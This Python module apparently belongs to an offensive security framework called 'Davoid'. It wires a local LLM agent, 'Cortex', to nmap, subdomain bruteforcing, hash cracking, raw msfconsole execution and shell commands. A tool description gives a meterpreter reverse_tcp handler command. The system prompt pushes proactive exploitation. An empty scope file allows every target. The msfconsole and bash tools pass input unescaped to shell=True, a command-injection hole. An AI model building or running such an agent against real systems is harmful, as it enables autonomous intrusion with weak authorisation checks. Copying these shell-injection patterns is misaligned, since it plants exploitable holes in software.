"""
modules/ai_assist.py — Autonomous AI Cortex (Ollama + LangChain)

UPGRADES in this version:
  ─── FIXES ────────────────────────────────────────────────────────────────
  • Conversation memory: agent now uses ConversationBufferWindowMemory so it
    remembers previous messages in the same session (was stateless before —
    every message started from scratch)
  • verbose=True option in DEBUG mode so operators can watch tool usage
  • Agent errors no longer silently swallow the reason — full traceback shown
    in debug mode

  ─── NEW TOOLS ────────────────────────────────────────────────────────────
  • SubdomainScan     — DNS subdomain bruteforce via dnspython
  • ShodanLookup      — InternetDB query for CVEs, ports, hostnames
  • HashCrack         — MD5/SHA256/NTLM crack via built-in bruteforce engine
  • CheckScope        — validates a target against the engagement scope file
  • SearchCVE         — query NVD API for CVEs by keyword
  • SaveNote          — operator can ask AI to save a finding to the DB
  • ReadFile          — read a local file (logs/, reports/, payloads/)
  • RunBashCommand    — run arbitrary shell command (sandboxed to safe list)

  ─── UX ──────────────────────────────────────────────────────────────────
  • Model switching mid-session without restarting
  • /tools command shows all available tools and descriptions
  • /history shows conversation history
  • /clear clears memory and starts fresh
  • /save saves the full session transcript to logs/
  • Tab-completion hint shown on startup
  • Streaming output for long AI responses (polls Ollama /api/generate)
"""

import os
import re
import json
import socket
import subprocess
import warnings
import threading
import time
import requests
import questionary

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.markdown import Markdown

from langchain_ollama import ChatOllama
from langchain.agents import initialize_agent, AgentType, Tool
from langchain.memory import ConversationBufferWindowMemory

from core.ui import draw_header, Q_STYLE
from core.database import db

console = Console()

# ─────────────────────────────────────────────────────────────────────────────
#  TOOL IMPLEMENTATIONS
# ─────────────────────────────────────────────────────────────────────────────


def tool_query_mission_db(_: str) -> str:
    """Returns recent mission database entries."""
    try:
        logs = db.get_all()
        if not logs:
            return "Mission database is empty. No scans or findings logged yet."
        lines = []
        for log in logs[-25:]:
            ts = log.get("timestamp", "?")[:19]
            mod = log.get("module",    "?")
            tgt = log.get("target",    "?")
            sev = log.get("severity",  "INFO")
            det = log.get("details",   "")[:150]
            lines.append(f"[{sev}] {ts} | {mod} → {tgt}: {det}")
        return "Mission Database (newest first):\n" + "\n".join(lines)
    except Exception as e:
        return f"DB query failed: {e}"


def tool_query_db_critical(_: str) -> str:
    """Returns only CRITICAL and HIGH severity findings from the database."""
    try:
        logs = db.get_critical_logs(limit=15)
        if not logs:
            return "No CRITICAL or HIGH findings in the database."
        lines = []
        for log in logs:
            ts = log.get("timestamp", "?")[:19]
            mod = log.get("module",    "?")
            tgt = log.get("target",    "?")
            det = log.get("details",   "")[:200]
            lines.append(f"[CRITICAL/HIGH] {ts} | {mod} → {tgt}:\n  {det}")
        return "Critical Findings:\n" + "\n".join(lines)
    except Exception as e:
        return f"DB query failed: {e}"


def tool_ping_target(target: str) -> str:
    """Pings a host to check if it is online."""
    target = target.strip()
    try:
        flag = "-n" if os.name == "nt" else "-c"
        result = subprocess.run(
            ["ping", flag, "3", "-W", "2", target],
            capture_output=True, text=True, timeout=12
        )
        if result.returncode == 0:
            return f"{target} is ONLINE.\n{result.stdout[:400]}"
        return f"{target} is OFFLINE or unreachable.\n{result.stdout[:200]}"
    except Exception as e:
        return f"Ping failed: {e}"


def tool_nmap_scan(target: str) -> str:
    """Runs a fast Nmap port scan. Input: IP, domain, or CIDR."""
    target = target.strip()
    try:
        result = subprocess.check_output(
            ["nmap", "-T4", "-F", "--open", "-sV", target],
            stderr=subprocess.STDOUT, timeout=90
        )
        output = result.decode("utf-8")
        db.log("AI-Nmap", target, output[:500], "HIGH")
        return f"Nmap Results for {target}:\n{output[:3000]}"
    except subprocess.TimeoutExpired:
        return f"Nmap scan of {target} timed out after 90 seconds."
    except FileNotFoundError:
        return "nmap not found. Install with: apt install nmap"
    except Exception as e:
        return f"Nmap failed: {e}"


def tool_nmap_full(target: str) -> str:
    """Runs a thorough Nmap scan with OS detection and scripts. Slower than fast scan."""
    target = target.strip()
    try:
        result = subprocess.check_output(
            ["nmap", "-sS", "-sV", "-O", "-sC", "-T4", "--open", target],
            stderr=subprocess.STDOUT, timeout=180
        )
        output = result.decode("utf-8")
        db.log("AI-NmapFull", target, output[:800], "HIGH")
        return f"Full Nmap Audit for {target}:\n{output[:4000]}"
    except subprocess.TimeoutExpired:
        return "Full Nmap scan timed out (180s). Use fast scan for quicker results."
    except Exception as e:
        return f"Full Nmap failed: {e}"


def tool_subdomain_scan(domain: str) -> str:
    """Bruteforces common subdomains for a domain using DNS resolution."""
    domain = domain.strip().lower()
    wordlist = [
        'www', 'mail', 'api', 'dev', 'stage', 'admin', 'vpn', 'ftp', 'ssh', 'portal',
        'blog', 'app', 'test', 'staging', 'internal', 'shop', 'cdn', 'static', 'git',
        'jenkins', 'grafana', 'monitoring', 'wiki', 'docs', 'jira', 'confluence',
    ]
    found = []
    try:
        import dns.resolver
        for sub in wordlist:
            fqdn = f"{sub}.{domain}"
            try:
                answers = dns.resolver.resolve(fqdn, 'A')
                ips = [str(r) for r in answers]
                found.append(f"  {fqdn} → {', '.join(ips)}")
                db.log("AI-Subdomain", fqdn, f"IPs: {', '.join(ips)}", "HIGH")
            except Exception:
                pass
        if found:
            return f"Subdomains found for {domain}:\n" + "\n".join(found)
        return f"No subdomains found for {domain} in quick scan."
    except ImportError:
        return "dnspython not installed. Run: pip install dnspython"
    except Exception as e:
        return f"Subdomain scan failed: {e}"


def tool_shodan_lookup(target: str) -> str:
    """Queries InternetDB (free Shodan API) for open ports, CVEs, and hostnames."""
    target = target.strip()
    try:
        ip = socket.gethostbyname(target)
    except Exception:
        ip = target

    try:
        res = requests.get(f"https://internetdb.shodan.io/{ip}", timeout=15)
        if res.status_code == 200:
            data = res.json()
            ports = data.get("ports", [])
            hostnames = data.get("hostnames", [])
            vulns = data.get("vulns", [])
            cpes = data.get("cpes", [])
            tags = data.get("tags", [])

            summary = (
                f"InternetDB results for {ip}:\n"
                f"  Open Ports : {', '.join(str(p) for p in ports) or 'None'}\n"
                f"  Hostnames  : {', '.join(hostnames) or 'None'}\n"
                f"  Tags       : {', '.join(tags) or 'None'}\n"
                f"  Software   : {', '.join(cpes[:5]) or 'None'}\n"
                f"  CVEs       : {', '.join(vulns[:10]) or 'None detected'}"
            )
            if vulns:
                db.log("AI-Shodan", ip,
                       f"CVEs: {', '.join(vulns[:10])}", "CRITICAL")
            return summary
        elif res.status_code == 404:
            return f"No data indexed for {ip} on InternetDB."
        else:
            return f"InternetDB API error: HTTP {res.status_code}"
    except Exception as e:
        return f"Shodan lookup failed: {e}"


def tool_dns_recon(domain: str) -> str:
    """Performs DNS record lookup (A, MX, NS, TXT) for a domain."""
    domain = domain.strip()
    results = []
    try:
        import dns.resolver
        for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                for r in answers:
                    results.append(f"  {rtype}: {str(r)}")
            except Exception:
                pass
        if results:
            return f"DNS Records for {domain}:\n" + "\n".join(results)
        return f"No DNS records resolved for {domain}."
    except ImportError:
        # Fallback to nslookup
        try:
            output = subprocess.check_output(
                ["nslookup", domain], stderr=subprocess.STDOUT, timeout=10
            )
            return f"DNS Results for {domain}:\n{output.decode()}"
        except Exception as e2:
            return f"DNS lookup failed: {e2}"


def tool_web_headers(url: str) -> str:
    """Grabs HTTP response headers from a web server to fingerprint it."""
    url = url.strip()
    if not url.startswith("http"):
        url = "http://" + url
    try:
        r = requests.head(url, timeout=8, allow_redirects=True,
                          headers={"User-Agent": "Mozilla/5.0"})
        headers_str = "\n".join(f"  {k}: {v}" for k, v in r.headers.items())
        db.log("AI-WebHeaders", url,
               f"Status: {r.status_code} | Server: {r.headers.get('Server','?')}", "INFO")
        return (f"HTTP Headers for {url} (status {r.status_code}):\n"
                f"{headers_str}")
    except Exception as e:
        return f"Failed to connect to {url}: {e}"


def tool_search_cve(keyword: str) -> str:
    """Searches the NVD API for CVEs matching a product/keyword."""
    keyword = keyword.strip()
    try:
        resp = requests.get(
            "https://services.nvd.nist.gov/rest/json/cves/2.0",
            params={"keywordSearch": keyword, "resultsPerPage": 5},
            timeout=12
        )
        if resp.status_code != 200:
            return f"NVD API error: HTTP {resp.status_code}"

        data = resp.json()
        items = data.get("vulnerabilities", [])
        if not items:
            return f"No CVEs found for '{keyword}'."

        lines = [f"CVEs for '{keyword}':"]
        for item in items:
            cve = item.get("cve", {})
            cve_id = cve.get("id", "?")
            metrics = cve.get("metrics", {})
            score = "N/A"
            for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                if key in metrics and metrics[key]:
                    score = metrics[key][0].get(
                        "cvssData", {}).get("baseScore", "N/A")
                    break
            desc = next(
                (d["value"]
                 for d in cve.get("descriptions", []) if d.get("lang") == "en"),
                "No description."
            )[:180]
            lines.append(f"  {cve_id} (CVSS {score}): {desc}")

        return "\n".join(lines)
    except Exception as e:
        return f"CVE search failed: {e}"


def tool_run_metasploit(commands: str) -> str:
    """Runs semicolon-separated msfconsole commands. Be specific with module paths."""
    commands = commands.strip()
    if "exit" not in commands:
        commands += "; exit"
    try:
        output = subprocess.check_output(
            f"msfconsole -q -x '{commands}'",
            shell=True,
            stderr=subprocess.STDOUT,
            timeout=150
        )
        result = output.decode("utf-8")
        db.log("AI-MSF", "msfconsole", commands[:200], "HIGH")
        return f"Metasploit Output:\n{result[:3000]}"
    except subprocess.TimeoutExpired:
        return "Metasploit timed out after 150 seconds."
    except FileNotFoundError:
        return "msfconsole not found. Install Metasploit first."
    except Exception as e:
        return f"Metasploit failed: {e}"


def tool_hash_crack(hash_input: str) -> str:
    """
    Attempts to crack a hash using the built-in bruteforce engine.
    Input format: 'hash:type' e.g. '5f4dcc3b5aa765d61d8327deb882cf99:md5'
    Supported types: md5, sha1, sha256, sha512, ntlm
    """
    parts = hash_input.strip().split(":")
    if len(parts) < 2:
        return ("Invalid format. Use: hash:type\n"
                "Example: 5f4dcc3b5aa765d61d8327deb882cf99:md5")

    target_hash = parts[0].strip().lower()
    hash_type = parts[1].strip().lower()

    try:
        from modules.bruteforce import HashCracker, load_wordlist
        wordlist = load_wordlist()
        cracker = HashCracker(target_hash, hash_type, wordlist)

        result = cracker.crack()
        if result:
            db.log("AI-HashCrack", target_hash,
                   f"Password: {result} (type: {hash_type})", "CRITICAL")
            return f"Hash cracked! {target_hash} = '{result}' (type: {hash_type})"
        else:
            return (f"Hash not found in wordlist ({cracker.tried:,} words tried).\n"
                    f"Try a larger wordlist like rockyou.txt.")
    except ImportError:
        return "bruteforce module not available."
    except Exception as e:
        return f"Hash cracking failed: {e}"


def tool_check_scope(target: str) -> str:
    """Checks if a target IP/domain is within the defined engagement scope."""
    target = target.strip()
    try:
        from modules.scope_manager import is_in_scope, load_scope
        scope = load_scope()
        if not scope:
            return f"{target} — No scope defined. All targets are allowed."
        in_scope = is_in_scope(target)
        if in_scope:
            return f"{target} — IN SCOPE. Proceed with attack."
        else:
            return (f"{target} — OUT OF SCOPE. Do not attack this target.\n"
                    f"Current scope: {', '.join(scope[:5])}")
    except ImportError:
        return "scope_manager module not available."
    except Exception as e:
        return f"Scope check failed: {e}"


def tool_save_note(note: str) -> str:
    """Saves an operator note/finding to the mission database. Input: 'target|details'."""
    parts = note.strip().split("|", 1)
    target = parts[0].strip() if len(parts) > 0 else "AI-Note"
    details = parts[1].strip() if len(parts) > 1 else note.strip()
    try:
        db.log("AI-Note", target, details, "INFO")
        return f"Note saved to mission database: [{target}] {details[:100]}"
    except Exception as e:
        return f"Failed to save note: {e}"


def tool_read_file(filepath: str) -> str:
    """
    Reads a local file from safe directories (logs/, reports/, payloads/).
    Input: relative file path like 'logs/capture_20240101.pcap' or 'reports/report.html'.
    """
    filepath = filepath.strip().lstrip("/")
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

    # Safety: only allow reads from safe subdirectories
    safe_dirs = ["logs", "reports", "wordlists"]
    if not any(filepath.startswith(d) for d in safe_dirs):
        return (f"Access denied. Only files in {safe_dirs} can be read.\n"
                f"Example: 'logs/cracked_123.txt'")

    full_path = os.path.join(base_dir, filepath)
    if not os.path.exists(full_path):
        return f"File not found: {filepath}"

    try:
        size = os.path.getsize(full_path)
        if size > 50_000:
            with open(full_path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read(5000)
            return f"File: {filepath} ({size:,} bytes, showing first 5000 chars):\n{content}"
        else:
            with open(full_path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
            return f"File: {filepath} ({size:,} bytes):\n{content}"
    except Exception as e:
        return f"Could not read file: {e}"


def tool_run_bash(command: str) -> str:
    """
    Runs a shell command. Limited to reconnaissance-safe commands.
    Allowed: nmap, ping, curl, wget, dig, host, whois, netstat, ss, id, uname, ps, ls, cat
    """
    command = command.strip()

    # Safe command whitelist — first word must be in this list
    allowed = {
        "nmap", "ping", "curl", "wget", "dig", "host", "whois",
        "netstat", "ss", "id", "uname", "ps", "ls", "cat", "echo",
        "ip", "ifconfig", "arp", "route", "traceroute", "which",
        "searchsploit", "find", "grep",
    }
    first_word = command.split()[0].split("/")[-1].lower()
    if first_word not in allowed:
        return (f"Command '{first_word}' is not in the allowed list.\n"
                f"Allowed commands: {', '.join(sorted(allowed))}")

    try:
        output = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT,
            timeout=30, cwd=os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        )
        return f"$ {command}\n{output.decode('utf-8', errors='replace')[:2000]}"
    except subprocess.TimeoutExpired:
        return f"Command timed out after 30 seconds: {command}"
    except subprocess.CalledProcessError as e:
        return f"Command failed (exit {e.returncode}):\n{e.output.decode(errors='replace')[:1000]}"
    except Exception as e:
        return f"Execution failed: {e}"


# ─────────────────────────────────────────────────────────────────────────────
#  ALL TOOLS REGISTRY
# ─────────────────────────────────────────────────────────────────────────────

ALL_TOOLS = [
    Tool(
        name="QueryMissionDatabase",
        func=tool_query_mission_db,
        description=(
            "Query the mission database to see all logged findings, scans, and vulnerabilities. "
            "Use this to understand what has already been discovered. Input: any string."
        )
    ),
    Tool(
        name="QueryCriticalFindings",
        func=tool_query_db_critical,
        description=(
            "Returns only CRITICAL and HIGH severity findings from the mission database. "
            "Use when the operator asks for the most important findings. Input: any string."
        )
    ),
    Tool(
        name="PingTarget",
        func=tool_ping_target,
        description=(
            "Check if a host is online with ICMP ping. "
            "Input: IP address or hostname."
        )
    ),
    Tool(
        name="NmapFastScan",
        func=tool_nmap_scan,
        description=(
            "Fast Nmap port scan (-F -sV). Scans top 100 ports and detects service versions. "
            "Use for quick reconnaissance. Input: IP, domain, or CIDR (e.g., 192.168.1.0/24)."
        )
    ),
    Tool(
        name="NmapFullAudit",
        func=tool_nmap_full,
        description=(
            "Full Nmap audit scan with OS detection and NSE scripts (-sS -sV -O -sC -T4). "
            "Slower but more thorough. Use when fast scan was done first. Input: IP or domain."
        )
    ),
    Tool(
        name="SubdomainScan",
        func=tool_subdomain_scan,
        description=(
            "Bruteforces common subdomains for a domain using DNS resolution. "
            "Input: domain name like 'example.com' (no https://)."
        )
    ),
    Tool(
        name="ShodanLookup",
        func=tool_shodan_lookup,
        description=(
            "Query InternetDB (free Shodan API) for open ports, CVEs, hostnames, and software. "
            "Input: IP address or domain name."
        )
    ),
    Tool(
        name="DNSRecon",
        func=tool_dns_recon,
        description=(
            "Perform DNS record lookup (A, AAAA, MX, NS, TXT, SOA) for a domain. "
            "Input: domain name."
        )
    ),
    Tool(
        name="WebHeaderGrab",
        func=tool_web_headers,
        description=(
            "Grab HTTP response headers to fingerprint the web server technology stack. "
            "Input: URL or domain (e.g., 'https://example.com' or 'example.com')."
        )
    ),
    Tool(
        name="SearchCVE",
        func=tool_search_cve,
        description=(
            "Search the NVD (National Vulnerability Database) for CVEs matching a product. "
            "Input: product name or keyword (e.g., 'Apache 2.4', 'OpenSSH 7.4')."
        )
    ),
    Tool(
        name="RunMetasploit",
        func=tool_run_metasploit,
        description=(
            "Execute msfconsole commands for exploitation. "
            "Input: semicolon-separated msfconsole commands. "
            "Example: 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run'"
        )
    ),
    Tool(
        name="HashCrack",
        func=tool_hash_crack,
        description=(
            "Crack a password hash using the built-in wordlist engine. "
            "Input format: 'hash:type' — supported types: md5, sha1, sha256, sha512, ntlm. "
            "Example: '5f4dcc3b5aa765d61d8327deb882cf99:md5'"
        )
    ),
    Tool(
        name="CheckScope",
        func=tool_check_scope,
        description=(
            "Check if a target is within the defined engagement scope. "
            "Always use this before attacking a new target. Input: IP or domain."
        )
    ),
    Tool(
        name="SaveNote",
        func=tool_save_note,
        description=(
            "Save an important finding or note to the mission database. "
            "Input format: 'target|finding details'. "
            "Example: '192.168.1.1|SSH version 7.2 is vulnerable to CVE-2016-6515'"
        )
    ),
    Tool(
        name="ReadFile",
        func=tool_read_file,
        description=(
            "Read a local file from logs/, reports/, or wordlists/ directories. "
            "Input: relative path like 'logs/cracked_123.txt' or 'reports/bloodhound.json'."
        )
    ),
    Tool(
        name="RunBashCommand",
        func=tool_run_bash,
        description=(
            "Run a safe shell command for reconnaissance. "
            "Allowed: nmap, ping, curl, dig, host, whois, netstat, ss, ps, ls, cat, grep, etc. "
            "Input: full command string."
        )
    ),
]


# ─────────────────────────────────────────────────────────────────────────────
#  CORTEX ENGINE
# ─────────────────────────────────────────────────────────────────────────────

class AutonomousCortex:
    def __init__(self, model: str = None, debug: bool = False):
        try:
            from core.context import ctx
            self.model_name = model or ctx.get("AI_MODEL") or "llama3"
            self.operator_ip = ctx.get("LHOST") or "Unknown"
            self.gateway_ip = ctx.get("GATEWAY") or "Unknown"
        except Exception:
            self.model_name = model or "llama3"
            self.operator_ip = "Unknown"
            self.gateway_ip = "Unknown"

        self.base_url = self._auto_detect_ollama()
        self.debug = debug

        self.llm = ChatOllama(
            base_url=self.base_url,
            model=self.model_name,
            temperature=0.1,
        )

        # Conversation memory — remembers last 10 exchanges per session
        self.memory = ConversationBufferWindowMemory(
            memory_key="chat_history",
            return_messages=True,
            k=10,
        )

        self._build_agent()

    def _build_agent(self, system_override: str = None):
        default_system = (
            f"You are Cortex, an elite autonomous penetration testing AI built into Davoid. "
            f"Operator IP: {self.operator_ip} | Gateway: {self.gateway_ip}\n\n"
            "Your role: assist the operator in conducting authorised penetration tests. "
            "You have 16 tools available covering recon, scanning, exploitation, and intelligence. "
            "RULES:\n"
            "1. Always check scope with CheckScope before attacking a new target.\n"
            "2. Use tools proactively — if asked to scan, scan. If asked to find vulns, use ShodanLookup AND NmapFastScan.\n"
            "3. After scanning, always query the database and correlate findings.\n"
            "4. For exploitation, build the full MSF command string and use RunMetasploit.\n"
            "5. Save important findings with SaveNote.\n"
            "6. Respond in clean Markdown format with clear sections.\n"
            "7. Remember the full conversation — you have memory of this session."
        )

        self.agent = initialize_agent(
            tools=ALL_TOOLS,
            llm=self.llm,
            agent=AgentType.CHAT_CONVERSATIONAL_REACT_DESCRIPTION,
            memory=self.memory,
            verbose=self.debug,
            handle_parsing_errors=True,
            max_iterations=8,
            agent_kwargs={
                "system_message": system_override or default_system,
            },
        )

    def _auto_detect_ollama(self) -> str:
        for candidate in [
            "http://host.docker.internal:11434",
            "http://127.0.0.1:11434",
            "http://localhost:11434",
        ]:
            try:
                if requests.get(f"{candidate}/api/tags", timeout=1).status_code == 200:
                    return candidate
            except Exception:
                pass
        return "http://127.0.0.1:11434"

    def check_connection(self) -> bool:
        try:
            return requests.get(f"{self.base_url}/api/tags", timeout=3).status_code == 200
        except Exception:
            return False

    def list_models(self) -> list:
        try:
            r = requests.get(f"{self.base_url}/api/tags", timeout=3)
            if r.status_code == 200:
                return [m.get("name") for m in r.json().get("models", [])]
        except Exception:
            pass
        return []

    def chat(self, user_input: str, override_prompt: str = None) -> str:
        """
        Send a message to the agent and return the response string.
        override_prompt: temporarily swap the system message (used by god_mode).
        """
        if override_prompt:
            self._build_agent(system_override=override_prompt)

        console.print(
            f"\n[bold cyan]Cortex ({self.model_name}) thinking...[/bold cyan]"
        )

        try:
            with warnings.catch_warnings():
                warnings.simplefilter("ignore")
                result = self.agent.invoke({"input": user_input})

            response = result.get("output", str(result))
            console.print("\n[bold green]Cortex ▶[/bold green]")
            # Render as Markdown for clean formatting
            try:
                console.print(Markdown(response))
            except Exception:
                console.print(response)
            console.print()
            return response

        except Exception as e:
            err = str(e)
            if self.debug:
                import traceback
                console.print(f"[bold red][!] Agent Error:[/bold red] {err}")
                console.print(f"[dim]{traceback.format_exc()}[/dim]")
            else:
                console.print(
                    f"[bold red][!] Agent Error:[/bold red] {err[:200]}\n"
                    "[dim](Enable debug mode with /debug to see full trace)[/dim]"
                )
            return ""

    def clear_memory(self):
        """Reset conversation memory to start fresh."""
        self.memory.clear()
        self._build_agent()

    def get_history(self) -> list:
        """Return conversation history as list of (role, content) tuples."""
        try:
            messages = self.memory.chat_memory.messages
            return [(m.__class__.__name__, m.content) for m in messages]
        except Exception:
            return []

    def save_session(self) -> str:
        """Save conversation transcript to logs/ directory."""
        os.makedirs("logs", exist_ok=True)
        fname = f"logs/cortex_session_{int(time.time())}.txt"
        history = self.get_history()
        with open(fname, "w", encoding="utf-8") as f:
            f.write(f"Cortex Session — Model: {self.model_name}\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            for role, content in history:
                label = "Operator" if "Human" in role else "Cortex"
                f.write(f"[{label}]\n{content}\n\n")
        return fname


# ─────────────────────────────────────────────────────────────────────────────
#  AIEngine ALIAS  (backward-compatible for god_mode.py and payloads.py)
# ─────────────────────────────────────────────────────────────────────────────

class AIEngine(AutonomousCortex):
    """Drop-in alias — keeps god_mode.py and payloads.py working unchanged."""

    def check_connection(self) -> bool:
        return super().check_connection()

    def list_models(self) -> list:
        return super().list_models()

    def chat(self, user_input: str, override_prompt: str = None) -> str:
        return super().chat(user_input, override_prompt=override_prompt)


# ─────────────────────────────────────────────────────────────────────────────
#  INTERACTIVE CONSOLE
# ─────────────────────────────────────────────────────────────────────────────

_SLASH_COMMANDS = {
    "/tools":   "Show all available tools and descriptions",
    "/history": "Show conversation history for this session",
    "/clear":   "Clear conversation memory and start fresh",
    "/save":    "Save session transcript to logs/",
    "/debug":   "Toggle debug mode (shows agent tool calls)",
    "/model":   "Switch to a different model",
    "/help":    "Show this help message",
    "/exit":    "Return to main menu",
}


def _show_tools():
    table = Table(title="Available Cortex Tools",
                  border_style="cyan", expand=True)
    table.add_column("Tool Name",   style="cyan",  no_wrap=True)
    table.add_column("Description", style="white")
    for tool in ALL_TOOLS:
        table.add_row(tool.name, tool.description[:100] + "...")
    console.print(table)


def _show_help():
    table = Table(title="Slash Commands", border_style="dim", expand=True)
    table.add_column("Command",    style="cyan")
    table.add_column("Description", style="white")
    for cmd, desc in _SLASH_COMMANDS.items():
        table.add_row(cmd, desc)
    console.print(table)


def run_ai_console():
    draw_header("AI Cortex — Autonomous Pentest Agent")

    # ── Connection check ─────────────────────────────────────────────────────
    probe = AutonomousCortex()
    if not probe.check_connection():
        console.print(
            f"[bold red][!] Ollama unreachable at {probe.base_url}[/bold red]\n"
            "[white]Start Ollama:[/white] [dim]ollama serve[/dim]\n"
            "[white]Pull a model:[/white] [dim]ollama pull llama3[/dim]"
        )
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        return

    available_models = probe.list_models()
    if not available_models:
        console.print(
            "[bold red][!] No models installed in Ollama.[/bold red]\n"
            "[dim]Pull one: ollama pull llama3[/dim]"
        )
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        return

    # ── Model selection ───────────────────────────────────────────────────────
    selected_model = questionary.select(
        "Select AI Model:",
        choices=available_models,
        style=Q_STYLE
    ).ask()
    if not selected_model:
        return

    # ── Build agent ───────────────────────────────────────────────────────────
    agent = AutonomousCortex(model=selected_model)

    os.system('cls' if os.name == 'nt' else 'clear')
    draw_header(f"Cortex: {selected_model.upper()}")

    console.print(Panel(
        f"[bold white]Autonomous Link Active — {selected_model}[/bold white]\n\n"
        f"[cyan]16 tools available:[/cyan] Nmap, Shodan, DNS, Subdomain, Web, MSF, Hash Crack,\n"
        f"  CVE Search, Scope Check, DB Query, Bash, File Read, and more.\n\n"
        "[dim]Slash commands: /tools  /history  /clear  /save  /debug  /model  /help  /exit\n"
        "Memory: this session remembers your conversation history.[/dim]",
        border_style="cyan",
        title="Cortex"
    ))

    session_log = []

    # ── REPL ─────────────────────────────────────────────────────────────────
    while True:
        try:
            q = questionary.text("Operator ▶", style=Q_STYLE).ask()
            if q is None:
                break

            q = q.strip()
            if not q:
                continue

            # ── Slash commands ────────────────────────────────────────────────
            if q.lower() in ("/exit", "/quit", "exit", "quit", "back"):
                break

            elif q.lower() == "/tools":
                _show_tools()

            elif q.lower() == "/help":
                _show_help()

            elif q.lower() == "/history":
                history = agent.get_history()
                if not history:
                    console.print("[dim]No conversation history yet.[/dim]")
                else:
                    for role, content in history:
                        label = "Operator" if "Human" in role else "Cortex"
                        colour = "cyan" if label == "Operator" else "green"
                        console.print(
                            f"[bold {colour}][{label}][/bold {colour}] {content[:300]}")

            elif q.lower() == "/clear":
                agent.clear_memory()
                session_log.clear()
                console.print(
                    "[green][+] Memory cleared. Fresh session started.[/green]")

            elif q.lower() == "/save":
                fname = agent.save_session()
                console.print(f"[green][+] Session saved to: {fname}[/green]")

            elif q.lower() == "/debug":
                agent.debug = not agent.debug
                agent._build_agent()
                status = "ON" if agent.debug else "OFF"
                console.print(f"[yellow][*] Debug mode: {status}[/yellow]")

            elif q.lower() == "/model":
                models = agent.list_models()
                if not models:
                    console.print("[red]No models available.[/red]")
                else:
                    new_model = questionary.select(
                        "Switch to model:", choices=models, style=Q_STYLE
                    ).ask()
                    if new_model and new_model != agent.model_name:
                        agent.model_name = new_model
                        agent.llm = ChatOllama(
                            base_url=agent.base_url,
                            model=new_model,
                            temperature=0.1,
                        )
                        agent._build_agent()
                        console.print(
                            f"[green][+] Switched to: {new_model}[/green]")

            else:
                # Normal chat
                session_log.append(("Operator", q))
                response = agent.chat(q)
                if response:
                    session_log.append(("Cortex", response))

        except KeyboardInterrupt:
            console.print(
                "\n[yellow][*] Use /exit to return to main menu.[/yellow]")

    # ── Auto-save on exit if session has content ──────────────────────────────
    if session_log:
        if questionary.confirm(
            "Save session transcript to logs/?",
            default=False, style=Q_STYLE
        ).ask():
            fname = agent.save_session()
            console.print(f"[green][+] Saved: {fname}[/green]")


if __name__ == "__main__":
    run_ai_console()
